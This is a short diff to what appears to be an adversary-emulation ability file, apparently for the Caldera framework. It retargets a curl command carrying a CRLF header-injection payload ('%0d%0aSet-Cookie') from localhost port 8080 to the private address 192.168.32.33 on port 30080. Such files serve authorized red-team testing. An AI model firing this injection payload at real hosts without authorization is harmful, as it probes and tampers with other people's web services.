@@ -6,7 +6,7 @@
   executors:
   - name: sh
     platform: linux
-    command: curl -i http://localhost:#{host.port.8080}/%0d%0aSet-Cookie:%20a=1;
+    command: curl -i http://192.168.32.33:#{host.port.30080}/%0d%0aSet-Cookie:%20a=1;
     code: null
     language: null
     build_target: null
@@ -20,7 +20,7 @@
   requirements:
   - module: plugins.stockpile.app.requirements.paw_provenance
     relationship_match:
-    - source: host.port.8080
+    - source: host.port.30080
       edge: ''
       target: ''
   privilege: ''
